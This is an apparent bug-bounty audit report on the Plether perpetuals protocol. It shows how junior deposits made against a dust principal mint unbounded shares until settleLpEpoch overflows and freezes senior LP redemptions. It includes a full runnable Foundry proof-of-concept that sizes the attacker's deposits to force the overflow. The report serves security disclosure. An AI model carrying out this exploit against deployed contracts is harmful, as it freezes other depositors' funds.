# \#99290 [SC-High] Unbounded Junior Share Minting at Dust Principal Overflows `settleLpEpoch` Freezing Senior LP Redemptions

**Submitted on Nov 12th 2026 at 22:13:22 UTC by @rubencrxz for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99290
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

Junior deposit activation in `HousePool._settleLpEpoch` is deferred only when the junior principal is exactly zero. When the junior principal is positive but dust, a pending junior deposit is still activated and priced by `TrancheVault.quoteDepositFromState` against that dust principal, with no bound on the shares minted relative to the existing supply. An unprivileged depositor can size deposits so that the senior coupon leaves the junior principal at one atom at each epoch boundary, multiplying the junior supply by several orders of magnitude per activation until it reaches the top of the uint256 range. From then on every weekday `settleLpEpoch` reverts with an arithmetic panic. Because senior and junior phases settle in the same call, matured senior LP redemptions stay unfunded for the whole live trading week, every week; pending junior deposits of other users cannot be cancelled, and the junior tranche can no longer activate deposits.

## Vulnerability Details

Three pieces interact:

- **Deferral rule:** `HousePool._settleLpEpoch` (HousePool.sol) only defers junior activation when the junior pricing assets are exactly zero:

  ```solidity
  bool juniorActivationDeferred = juniorDepositPhase.pricingAssets == 0 && ...;
  ```

  Any positive dust principal lets activation proceed.
- **Unbounded pricing and mint:** `HousePool._settleDepositPhase` prices the epoch through `TrancheVault.quoteDepositFromState`, which computes `Math.mulDiv(netAssets, pricingSupply + VIRTUAL_SHARES, principal + 1, ...)`, and `TrancheVault.finalizeDepositEpochFromPool` mints that amount. With the principal at one atom, a deposit of X mints roughly `X · supply / 2` shares. There is no cap on new shares relative to the existing supply and no floor on the price per share.
- **All-or-nothing settlement:** the senior and junior phases run in the same `settleLpEpoch` call. Once the junior supply is near `type(uint256).max`, the next junior deposit activation overflows in the share quote or the mint, and the senior phase reverts with it.

Attack sequence (all permissionless):

1. The junior principal is near wipe. This is the designed failure mode of a first-loss tranche: any path that drives the junior towards zero (trading losses, the senior coupon, or both) passes through the dust region before reaching zero, which is exactly where the deferral does not apply. The PoC uses the mildest path: launch parameters and seeds, four basket legs of +/-10% within the historical range won by unrelated traders, then the senior coupon.
2. The attacker requests a junior deposit sized from public state so that, after the senior coupon at the next epoch boundary, the junior principal is one atom.
3. A permissionless `settleLpEpoch` at the boundary (the same second an honest keeper would use) activates the deposit and multiplies the junior supply.
4. Steps 2-3 are repeated for a few epochs until the supply sits at the top of the uint256 range.
5. Any subsequent fee-paying trade leaves the junior with a positive principal, and every weekday `router.settleLpEpoch` reverts with `Panic(0x11)`.

**Control case:** the same sequence activating against a junior principal of 1,000 USDG keeps the supply small; settlement confirms, the senior redemption is funded and the pending junior deposit activates normally. This isolates activation at a dust principal as the cause.

This is distinct from the documented limitations. SECURITY.md (Known Limitations) states that senior coupon payments are capped by available junior principal; that bounds how far the coupon draws down the junior and says nothing about activating deposits against a dust junior. Cecuro LOW-72 concerns the share quote of a pending deposit for a tranche in the terminal wipe state (`J == 0`), a view-level issue; this finding is the `J > 0` dust case, where activation is live and mints shares with real effects on settlement.

## Impact Details

Temporary freezing of funds for at least 24 hours.

- Matured senior LP redemptions are not funded during the live trading week. The PoC shows every hourly weekday settlement reverting from the first trading day until the weekend frozen window, far beyond 24 consecutive hours, while the matured senior redemption stays unfunded and the senior LP receives nothing. This returns every week after a single fee-paying trade.
- A matured junior deposit of an unrelated user cannot be cancelled while the overflow persists, and the junior tranche can no longer activate deposits.

This is not a liquidity shortfall: the pool has free cash to fund the redemption, as the control case and the weekend settlement show; during the week the redemption is not paid because the settlement call itself reverts. The attacker does not create the near-wipe state, only observes it and acts, and the attack costs a small fraction of a percent of the frozen value, so it is not griefing in the program's sense. It is not claimed as permanent: in the weekend frozen window junior entries are deferred, so settlement confirms and senior LPs can exit at the frozen-window fee.

## References

- `packages/perps/src/HousePool.sol`: `_settleLpEpoch` (`juniorActivationDeferred`), `_settleDepositPhase`, `settleLpEpoch`
- `packages/perps/src/TrancheVault.sol`: `quoteDepositFromState`, `finalizeDepositEpochFromPool`, `cancelPendingDeposit`
- `packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol`: `paySeniorCoupon`
- `packages/perps/SECURITY.md` (Known Limitations: senior coupon capped by junior principal); Cecuro LOW-72
- PoC: `packages/perps/test/poc/JuniorDustActivationOverflow.t.sol`

## Proof of Concept

## Proof of Concept

A runnable Foundry test reproduces the finding on the frozen commit `a82d4fef`. It uses the repository's `BasePerpTest`, applies the launch parameters and seeds through the governance timelocks, and mocks only the out-of-scope components (Pyth and USDG). Orders go through `OrderRouter.commitOrder` / `executeOrder` and LP epochs through `router.settleLpEpoch` (and `pool.settleLpEpoch` in the frozen window, as any keeper can). The router instance is the repository's test wrapper, which inherits `OrderRouter` unchanged and only adds a scalar `commitOrder` overload that the PoC does not use. No in-scope contract is modified.

### Steps

1. Deploy with launch parameters and seeds; a junior LP and a senior LP deposit.
2. Four basket legs of +/-10% between 1.00 and 1.10, each won by an unrelated trader, reduce the junior principal; the senior coupon then draws down the remainder towards wipe.
3. The attacker, reading public state, requests a junior deposit sized so that after the coupon at the next epoch boundary the junior principal is exactly one atom.
4. `router.settleLpEpoch` at the boundary (+1 s) activates the deposit. The test asserts `minted == mulDiv(x, supply + 1000, principal + 1)` and that the supply grows by at least `x / 2` per activation.
5. Steps 3-4 are repeated until the junior supply is in `[2^255, 2^256)`.
6. The senior LP requests a redemption of half of its shares and an unrelated user requests a junior deposit in the same epoch as a small attacker deposit; an unrelated fee-paying trade then leaves the junior principal positive.
7. Every hourly weekday `router.settleLpEpoch` reverts with `Panic(0x11)` until the weekend frozen window. On every attempt the test asserts that the matured senior redemption is still unfunded and that the unrelated user's `cancelPendingDeposit` on the junior reverts. The unfunded period exceeds 24 hours.
8. Exit check: in the weekend frozen window settlement confirms and funds the senior redemption.
9. Control case: the same sequence activating against a junior principal of 1,000 USDG keeps the supply small; settlement confirms, the senior redemption is funded and the unrelated user's deposit activates.

### Tests

- `test_WeekdaySettlementRevertsAndSeniorRedemptionStaysUnfunded` (steps 1-7)
- `test_FrozenWeekendSettlementCommits` (step 8)
- `test_ControlActivationAtThousandUsdgPrincipal` (step 9)

### Run

Place the file at `packages/perps/test/poc/JuniorDustActivationOverflow.t.sol` and run:

```bash
cd packages/perps && forge test --match-path test/poc/JuniorDustActivationOverflow.t.sol -vv
```

Expected: 3 passed, 0 failed.

### Code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Run: forge test --match-path test/poc/JuniorDustActivationOverflow.t.sol -vv

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {ICfdEngineRiskParamsView} from "@plether/perps/interfaces/ICfdEngineRiskParamsView.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {console2} from "forge-std/console2.sol";

/// @title Junior deposit activation at dust principal compounds share supply until LP settlement overflows
/// @notice `HousePool._settleLpEpoch` defers a Junior deposit epoch only when the post-reconcile Junior principal is
///         exactly zero. Any nonzero principal, down to one atom, activates the epoch at
///         `shares = assets * (supply + 1000) / (principal + 1)` (`TrancheVault.quoteDepositFromState`) with no bound on
///         issuance. The Senior coupon is paid from Junior principal on every reconcile and is capped by it, so from
///         public state a depositor can size each request so that the next activation sees Junior principal of exactly
///         one atom at the epoch boundary + 1 s, the second an ordinary keeper settles. Each activation multiplies supply
///         by about `assets / 2`. After about ten activations supply sits in [2^255, 2^256). From then on any Junior
///         deposit activation overflows (`Math.mulDiv` / ERC20 `_mint`), and because one settlement call handles Senior
///         redemptions, Junior redemptions and deposits together, every weekday `settleLpEpoch` reverts with
///         `Panic(0x11)`: matured Senior redemptions stay unfunded and pending Junior deposits can be neither activated
///         nor cancelled. A single fee-paying trade after the last committed reconcile keeps Junior principal above zero
///         and the overflow armed.
///
///         Release parameters from DEPLOYMENT.md (seeds 1 USDG per tranche, 80 % Senior share) are installed through
///         the production governance timelocks. The precondition is four trading legs of +/-10 % between 1.00 and 1.10
///         (inside the 22.67 % historical peak-to-trough, WHITEPAPER.md section 8.2), each won by an unrelated trader,
///         followed by ordinary coupon accrual. All trading uses the production V3 `OrderRouter.commitOrder` and
///         `executeOrder`; all LP settlement uses `OrderRouter.settleLpEpoch` (direct `HousePool.settleLpEpoch` only
///         in oracle-frozen windows, as for any keeper). Only Pyth and USDG are mocked.
contract JuniorDustActivationOverflowTest is BasePerpTest {

    // ------------------------------------------------------------------ release parameters (DEPLOYMENT.md)
    uint256 internal constant L_VPI = 0.01e18;
    uint256 internal constant L_MAX_SKEW = 0.4e18;
    uint256 internal constant L_MAINT = 10;
    uint256 internal constant L_IM = 20;
    uint256 internal constant L_FAD = 300;
    uint256 internal constant L_CARRY = 500;
    uint256 internal constant L_MIN_BOUNTY = 1e6;
    uint256 internal constant L_BOUNTY_BPS = 10;
    uint256 internal constant L_KEEPER_SHARE = 5000;
    uint256 internal constant L_PROTOCOL_SHARE = 0;
    uint256 internal constant L_EXEC_FEE = 4;
    uint256 internal constant L_FROZEN_SPREAD = 50;
    uint256 internal constant L_SETTLEMENT_BUFFER = 25;
    uint256 internal constant L_MIN_OPEN_NOTIONAL = 1000e6;
    uint256 internal constant L_ADVERSE_CONF = 2500;
    uint256 internal constant L_TRIGGER_BOUNTY = 200_000;
    uint256 internal constant L_MAX_PENDING = 5;
    uint256 internal constant L_SENIOR_CAP = 40_000_000e6;
    uint256 internal constant L_SENIOR_SHARE = 8000;

    // ------------------------------------------------------------------ actors and constants
    address internal constant JUNIOR_LP = address(0x7E01);
    address internal constant SENIOR_LP = address(0x7E02);
    address internal constant VICTIM = address(0x7E03); // unrelated Junior depositor
    address internal constant ATTACKER = address(0xA77A); // Junior depositor only
    address internal constant TRADER_A = address(0xA0A1);
    address internal constant TRADER_B = address(0xA0A2);
    address internal constant FEE_TRADER = address(0xA005);
    address internal constant KEEPER = address(0xBEE9);
    uint256 internal constant LOT = 1e20;
    uint256 internal constant YEAR = 31_536_000;
    uint256 internal constant HALF = 2 ** 255;
    bytes4 internal constant PANIC = 0x4e487b71;

    uint256 internal px;
    uint256 internal clientNonce;
    uint256 internal attackerDeposited;
    uint256 internal activations;
    uint256 internal tLanding;
    uint256 internal tStart;

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _fundJunior(JUNIOR_LP, 250_000e6);
        _fundSenior(SENIOR_LP, 1_000_000e6);
        px = 1e8;
        _applyReleaseConfig();
        _enterLiveWindow();
        tStart = vm.getBlockTimestamp();
    }

    // ------------------------------------------------------------------ release configuration through governance
    function _applyReleaseConfig() internal {
        ICfdEngineAdminHost.EngineRiskConfig memory risk;
        risk.riskParams = CfdTypes.RiskParams({
            vpiFactor: L_VPI,
            maxSkewRatio: L_MAX_SKEW,
            maintMarginBps: L_MAINT,
            initMarginBps: L_IM,
            fadMarginBps: L_FAD,
            baseCarryBps: L_CARRY,
            minBountyAssets: L_MIN_BOUNTY,
            bountyBps: L_BOUNTY_BPS,
            keeperShareBps: L_KEEPER_SHARE,
            protocolShareBps: L_PROTOCOL_SHARE
        });
        risk.executionFeeBps = L_EXEC_FEE;
        risk.frozenCloseSpreadBps = L_FROZEN_SPREAD;
        risk.settlementBufferBps = L_SETTLEMENT_BUFFER;
        engineAdmin.proposeRiskConfig(risk);

        IOrderRouterAdminHost.RouterConfig memory rc = _routerConfig();
        rc.minOpenNotionalAssets = L_MIN_OPEN_NOTIONAL;
        rc.adverseConfidenceMultiplierBps = L_ADVERSE_CONF;
        rc.positionProtectionTriggerBountyAssets = L_TRIGGER_BOUNTY;
        rc.maxPendingOrders = L_MAX_PENDING;
        routerAdmin.proposeRouterConfig(rc);

        IHousePool.PoolConfig memory pc = _currentPoolConfig();
        pc.maxSeniorExposureAssets = L_SENIOR_CAP;
        pc.maxSeniorShareBps = L_SENIOR_SHARE;
        pool.proposePoolConfig(pc);

        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        vm.roll(vm.getBlockNumber() + 1);
        engineAdmin.finalizeRiskConfig();
        routerAdmin.finalizeRouterConfig();
        pool.finalizePoolConfig();

        CfdTypes.RiskParams memory p = ICfdEngineRiskParamsView(address(engine)).riskParams();
        assertEq(p.vpiFactor, L_VPI, "release vpiFactor");
        assertEq(p.maintMarginBps, L_MAINT, "release maintenance margin");
        assertEq(p.initMarginBps, L_IM, "release initial margin");
        assertEq(engine.executionFeeBps(), L_EXEC_FEE, "release execution fee");
        assertEq(engine.frozenCloseSpreadBps(), L_FROZEN_SPREAD, "release frozen-close spread");
        assertEq(pool.maxSeniorExposureAssets(), L_SENIOR_CAP, "release senior cap");
        assertEq(pool.maxSeniorShareBps(), L_SENIOR_SHARE, "release senior share");
        assertEq(pool.seniorRateBps(), 800, "senior coupon 8 %");
    }

    /// @dev Next Monday 10:00 UTC (live, not FAD) and a fresh mark through the permissionless Router refresh.
    function _enterLiveWindow() internal {
        uint256 day = vm.getBlockTimestamp() / 1 days;
        uint256 weekday = (day + 3) % 7; // 0 = Monday
        uint256 target = (day + (weekday == 0 ? 7 : 7 - weekday)) * 1 days + 10 hours;
        vm.warp(target);
        vm.roll(vm.getBlockNumber() + 1);
        require(!engine.isFadWindow() && !engine.isOracleFrozen(), "live window expected");
        _mark();
    }

    // ------------------------------------------------------------------ oracle and trading through the production Router
    function _payload(uint256 publishTime, uint256 prev) internal view returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ups = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ups[i] = MockPyth.FeedUpdate({
                id: ids[i],
                price: MockPyth.MockPrice({
                    price: int64(uint64(px)), conf: 0, expo: -8, publishTime: publishTime, prevPublishTime: prev
                })
            });
        }
        data = new bytes[](1);
        data[0] = abi.encode(ups);
    }

    function _tick() internal {
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _mark() internal {
        _tick();
        uint256 t = vm.getBlockTimestamp();
        bytes[] memory upd = _payload(t, t - 1);
        vm.prank(KEEPER);
        router.updateMarkPrice(upd);
    }

    function _move(bool up, uint256 bps) internal {
        int256 d = up ? int256(bps) : -int256(bps);
        px = uint256(int256(px) + (int256(px) * d) / 10_000);
        _mark();
    }

    function _commit(address account, CfdTypes.Side side, uint256 size, uint256 margin, bool isClose) internal {
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory req = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(++clientNonce),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(account);
        OrderRouter(payable(address(router))).commitOrder(req);
    }

    function _executeHead() internal {
        uint64 head = router.nextExecuteId();
        (IOrderRouterAccounting.PendingOrderView memory pv,) = router.getPendingOrderView(head);
        _tick();
        uint256 nowT = vm.getBlockTimestamp();
        uint256 pt = uint256(pv.commitTime) + 1;
        if (engine.lastMarkTime() > pt) pt = engine.lastMarkTime();
        if (pt > nowT) pt = nowT;
        bytes[] memory upd = _payload(pt, pv.commitTime);
        vm.prank(KEEPER);
        router.executeOrder(head, upd);
    }

    function _open(address t, CfdTypes.Side side, uint256 lots, uint256 margin) internal {
        _mark();
        (uint256 s0,,,,,,) = engine.positions(t);
        _commit(t, side, lots * LOT, margin, false);
        _executeHead();
        (uint256 s1,,,,,,) = engine.positions(t);
        assertEq(s1, s0 + lots * LOT, "open executed");
    }

    function _close(address t) internal {
        _mark();
        (uint256 size,,,, CfdTypes.Side side,,) = engine.positions(t);
        _commit(t, side, size, 0, true);
        _executeHead();
        (uint256 s1,,,,,,) = engine.positions(t);
        assertEq(s1, 0, "close executed");
    }

    /// @dev An unrelated 10-lot round trip: ordinary execution fees and VPI, i.e. ordinary LP revenue.
    function _feePayingTrade() internal {
        _fundTrader(FEE_TRADER, 300e6);
        _open(FEE_TRADER, CfdTypes.Side.LONG, 10, 200e6);
        _close(FEE_TRADER);
    }

    // ------------------------------------------------------------------ LP helpers
    function _hourStart(uint256 t) internal pure returns (uint256) {
        return (t / 1 hours) * 1 hours;
    }

    /// @dev Monday-Thursday 06:00-21:00 UTC: always live, never FAD or oracle-frozen.
    function _weekdayHours(uint256 t) internal pure returns (bool) {
        uint256 wd = ((t / 1 days) + 3) % 7;
        uint256 h = (t % 1 days) / 1 hours;
        return wd <= 3 && h >= 6 && h < 21;
    }

    /// @dev First epoch boundary + 1 s at or after `t` inside weekday hours: the second an ordinary keeper settles.
    function _nextBoundary(uint256 t) internal pure returns (uint256) {
        uint256 b = _hourStart(t) + 1 hours;
        for (uint256 i; i < 24 * 8; ++i) {
            if (_weekdayHours(b)) return b + 1;
            b += 1 hours;
        }
        revert("no boundary");
    }

    /// @dev Projected (Senior, Junior) principal at time `t`, i.e. what settlement reconciles at that second.
    function _projectedAt(uint256 t) internal returns (uint256 s, uint256 j) {
        uint256 now0 = vm.getBlockTimestamp();
        vm.warp(t);
        (s, j) = pool.getPendingDepositTrancheState();
        vm.warp(now0);
    }

    function _couponDue(uint256 seniorPrincipal, uint256 elapsed) internal view returns (uint256) {
        return (seniorPrincipal * pool.seniorRateBps() * elapsed) / (10_000 * YEAR);
    }

    function _requestJunior(address who, uint256 assets) internal returns (uint256 id) {
        settlementToken.mint(who, assets);
        vm.startPrank(who);
        settlementToken.approve(address(juniorVault), assets);
        id = juniorVault.requestDeposit(assets, who, who);
        vm.stopPrank();
    }

    /// @dev Keeper settlement at `t`: Router path in live hours, direct pool path when the oracle is frozen.
    function _settleAt(uint256 t) internal returns (bool ok, bytes4 sel) {
        require(t >= vm.getBlockTimestamp(), "time moves forward");
        vm.warp(t);
        vm.roll(vm.getBlockNumber() + 1);
        bytes memory r;
        if (engine.isOracleFrozen()) {
            vm.prank(KEEPER);
            (ok, r) = address(pool).call(abi.encodeWithSignature("settleLpEpoch(uint256,uint256)", 0, 0));
        } else {
            bytes[] memory upd = _payload(t, t - 1);
            vm.prank(KEEPER);
            (ok, r) = address(router).call(abi.encodeWithSignature("settleLpEpoch(bytes[])", upd));
        }
        if (!ok && r.length >= 4) sel = bytes4(r);
    }

    function _tryCancel(address who, uint256 id) internal returns (bool ok) {
        vm.prank(who);
        (ok,) = address(juniorVault).call(abi.encodeWithSignature("cancelPendingDeposit(uint256)", id));
    }

    // ------------------------------------------------------------------ precondition: ordinary trading losses
    /// @dev One leg won by an unrelated trader at ~38 % of pool depth: +10 % (Short wins) or back to 1.00 (Long wins).
    function _leg(address t, CfdTypes.Side side, bool up) internal {
        uint256 depth = pool.totalAssets();
        uint256 lots = (depth * 38) / 100 / ((px * 100e6) / 1e8);
        _fundTrader(t, (depth * 6) / 100);
        _open(t, side, lots, (depth * 5) / 100);
        _move(up, up ? 1000 : 909);
        _close(t);
    }

    function _tradingLosses() internal {
        (, uint256 j0) = pool.getPendingDepositTrancheState();
        _leg(TRADER_A, CfdTypes.Side.SHORT, true);
        _leg(TRADER_B, CfdTypes.Side.LONG, false);
        _leg(TRADER_A, CfdTypes.Side.SHORT, true);
        _leg(TRADER_B, CfdTypes.Side.LONG, false);
        (uint256 s, uint256 j) = pool.getPendingDepositTrancheState();
        console2.log("junior principal before trading losses", j0);
        console2.log("junior principal after four +/-10% legs", j);
        console2.log("senior principal", s);
        console2.log("basket price after the legs (1e8)", px);
        assertGt(px, 0.99e8, "basket back near 1.00");
        assertLt(px, 1.01e8, "basket back near 1.00");
        assertGt(j, 0, "junior not wiped by trading");
    }

    // ------------------------------------------------------------------ activation cycles
    /// @param dustTarget Junior principal targeted at each activation (1 atom for the attack, 1,000 USDG for the control).
    function _activationCycles(uint256 dustTarget, uint256 maxCycles) internal {
        uint256 gap = 2 hours;
        uint256 tAct = _nextBoundary(vm.getBlockTimestamp() + 1 hours);
        for (uint256 k; k < maxCycles; ++k) {
            uint256 tReq = _hourStart(tAct) - 600;
            require(tReq > vm.getBlockTimestamp(), "request after previous settlement");
            vm.warp(tReq);
            vm.roll(vm.getBlockNumber() + 1);

            (uint256 sp, uint256 jp) = _projectedAt(tAct);
            require(jp > 0, "junior principal positive at activation");
            uint256 n0 = juniorVault.totalSupply();

            // Size the request so stored Junior principal after this activation (jp + x) is drained by the coupon to
            // exactly `dustTarget` at the next boundary + 1 s.
            uint256 tNext =
                _nextBoundary(tAct + gap + ((jp + 1e6) * 10_000 * YEAR) / (sp * pool.seniorRateBps()));
            uint256 x = _couponDue(sp, tNext - tAct) + dustTarget - jp;
            bool landing;
            if (dustTarget == 1) {
                // Final activation: put supply in [2^255, 2^256) for <= 100 USDG.
                uint256 th = Math.mulDiv(HALF, jp + 1, n0 + 1000) + 1;
                if (th <= 1e8 || th <= x) {
                    x = th < 1e6 ? 1e6 : th;
                    landing = true;
                } else {
                    // One-step lookahead: raise the next dust level so the penultimate activation does not skip the
                    // cheap final window.
                    uint256 l1 = type(uint256).max / 1e8;
                    uint256 n1p = n0 + Math.mulDiv(x, n0 + 1000, jp + 1);
                    uint256 x0 = _couponDue(sp, gap);
                    if (n1p < l1 && Math.mulDiv(n1p, x0, 2) >= l1) {
                        x = x + Math.mulDiv(x0, n1p, l1 * 10 - n1p) - 1;
                    }
                }
            }
            require(x >= 1e6, "request below minimum deposit");
            _requestJunior(ATTACKER, x);
            attackerDeposited += x;

            (bool ok,) = _settleAt(tAct);
            assertTrue(ok, "activation settlement succeeds");
            uint256 n1 = juniorVault.totalSupply();
            ++activations;
            // Minted shares follow the uncapped quote at the reconciled Junior principal.
            assertEq(n1 - n0, Math.mulDiv(x, n0 + 1000, jp + 1), "minted = assets * (supply + 1000) / (principal + 1)");
            if (jp == 1) {
                assertGe(n1 / n0, x / 2, "supply grows by at least assets/2 per activation at one-atom principal");
            }
            console2.log(
                string.concat(
                    "activation ",
                    vm.toString(k),
                    ": junior principal ",
                    vm.toString(jp),
                    " atoms, deposit ",
                    vm.toString(x),
                    ", log2(supply) ",
                    vm.toString(Math.log2(n1)),
                    ", growth factor ",
                    vm.toString(n1 / n0)
                )
            );
            if (landing) {
                tLanding = tAct;
                return;
            }
            tAct = tNext;
        }
    }

    function _toOverflowState() internal {
        _tradingLosses();
        _activationCycles(1, 40);
        assertGe(juniorVault.totalSupply(), HALF, "junior share supply >= 2^255");
        console2.log("activations", activations);
        console2.log("attacker USDG deposited into Junior", attackerDeposited);
        console2.log("days from first trade to final activation", (tLanding - tStart) / 1 days);
    }

    /// @dev Attacker parks a Junior deposit at the queue head; an unrelated user deposits in the same epoch; the
    ///      Senior LP requests half of its shares; an unrelated fee-paying trade adds ordinary LP revenue.
    function _arm() internal returns (uint256 attackerId, uint256 victimId, uint256 seniorId, uint256 seniorShares) {
        vm.warp(tLanding + 120);
        vm.roll(vm.getBlockNumber() + 1);
        attackerId = _requestJunior(ATTACKER, 100e6);
        victimId = _requestJunior(VICTIM, 10_000e6);
        assertEq(attackerId, victimId, "same deposit epoch");
        seniorShares = seniorVault.balanceOf(SENIOR_LP) / 2;
        vm.prank(SENIOR_LP);
        seniorId = seniorVault.requestRedeem(seniorShares, SENIOR_LP, SENIOR_LP);
        _feePayingTrade();
    }

    // ------------------------------------------------------------------ tests
    /// @notice Main: weekday settlement reverts with Panic(0x11); the matured Senior redemption stays unfunded for more
    ///         than 24 hours; the unrelated Junior depositor cannot cancel.
    function test_WeekdaySettlementRevertsAndSeniorRedemptionStaysUnfunded() public {
        _toOverflowState();
        (, uint256 victimId, uint256 seniorId, uint256 seniorShares) = _arm();
        uint256 seniorValue = seniorVault.convertToAssets(seniorShares);
        uint256 matured = pool.lpEpochStart(seniorId);

        uint256 reverts;
        uint256 firstHour;
        uint256 lastHour;
        uint256 t = _hourStart(vm.getBlockTimestamp()) + 1 hours + 60;
        // Every hourly keeper settlement until the oracle-frozen weekend window.
        while (true) {
            (bool ok, bytes4 sel) = _settleAt(t);
            if (engine.isOracleFrozen()) break;
            assertFalse(ok, "weekday settlement reverts");
            assertEq(sel, PANIC, "arithmetic overflow in the Junior deposit phase");
            assertFalse(_tryCancel(VICTIM, victimId), "unrelated Junior deposit cannot be cancelled");
            assertEq(seniorVault.claimableRedeemAssets(seniorId, SENIOR_LP), 0, "matured Senior redemption unfunded");
            if (firstHour == 0) firstHour = t;
            lastHour = t;
            ++reverts;
            t += 1 hours;
        }
        uint256 frozenFor = lastHour - matured;
        console2.log("matured Senior redemption value (USDG atoms)", seniorValue);
        console2.log("consecutive weekday settlements reverted", reverts);
        console2.log("first reverted settlement (unix)", firstHour);
        console2.log("last reverted settlement (unix)", lastHour);
        console2.log("hours the matured Senior redemption stayed unfunded", frozenFor / 1 hours);
        console2.log("Senior claimable at the first oracle-frozen settlement", seniorVault.claimableRedeemAssets(seniorId, SENIOR_LP));
        console2.log("victim Junior escrow still pending", juniorVault.pendingDepositRequest(victimId, VICTIM));
        assertGe(frozenFor, 24 hours, "matured Senior redemption unfunded for at least 24 hours");
        assertEq(settlementToken.balanceOf(SENIOR_LP), 0, "Senior LP received nothing during the week");
        assertEq(juniorVault.pendingDepositRequest(victimId, VICTIM), 10_000e6, "victim escrow still pending");
    }

    /// @notice Exit path: in the oracle-frozen weekend window entries are deferred, so settlement commits and funds the
    ///         Senior redemption (net of the frozen LP exit fee).
    function test_FrozenWeekendSettlementCommits() public {
        _toOverflowState();
        (,, uint256 seniorId,) = _arm();
        uint256 t = _hourStart(vm.getBlockTimestamp()) + 1 hours + 60;
        bool ok;
        bytes4 sel;
        while (true) {
            (ok, sel) = _settleAt(t);
            if (engine.isOracleFrozen()) break;
            assertFalse(ok, "settlement reverts before the frozen window");
            t += 1 hours;
        }
        console2.log("frozen-window settlement ok", ok ? 1 : 0);
        console2.log("Senior claimable after frozen settlement", seniorVault.claimableRedeemAssets(seniorId, SENIOR_LP));
        assertTrue(ok, "frozen-window settlement commits");
        assertGt(seniorVault.claimableRedeemAssets(seniorId, SENIOR_LP), 0, "Senior redemption funded in the frozen window");
    }

    /// @notice Control: the same precondition, cadence and request sizing with activation at 1,000 USDG of Junior
    ///         principal. Supply stays small and the same post-sequence settles normally.
    function test_ControlActivationAtThousandUsdgPrincipal() public {
        _tradingLosses();
        _activationCycles(1_000e6, 10);
        uint256 n = juniorVault.totalSupply();
        tLanding = vm.getBlockTimestamp();
        (, uint256 victimId, uint256 seniorId,) = _arm();
        bool committed;
        for (uint256 h; h < 24 && !committed; ++h) {
            (committed,) = _settleAt(_hourStart(vm.getBlockTimestamp()) + 1 hours + 60);
        }
        console2.log("control: log2(junior supply)", Math.log2(n));
        console2.log("control: Senior claimable", seniorVault.claimableRedeemAssets(seniorId, SENIOR_LP));
        console2.log("control: victim deposit pending", juniorVault.pendingDepositRequest(victimId, VICTIM));
        assertLt(n, 2 ** 64, "control supply stays small");
        assertTrue(committed, "control settlement commits");
        assertGt(seniorVault.claimableRedeemAssets(seniorId, SENIOR_LP), 0, "control Senior redemption funded");
        assertEq(juniorVault.pendingDepositRequest(victimId, VICTIM), 0, "control victim deposit activated");
    }

}
```
